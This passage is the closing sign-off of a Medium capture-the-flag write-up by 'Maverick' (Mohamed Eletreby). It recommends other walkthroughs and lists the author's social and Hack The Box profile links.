And pwwwwned, finally, the last words to you: this write-up was made with love by Mohamed Eletrepy, aka Maverick. Happy hacking, byebye! Don’t forget to watch ippsec’s walkthrough and read 0xdf’s write-up for learning more

---

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*_jQO5WhSdgBeRv8q.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking!

By Mohamed Eletreby on April 24, 2025.

Canonical link

Exported from Medium on April 20, 2026.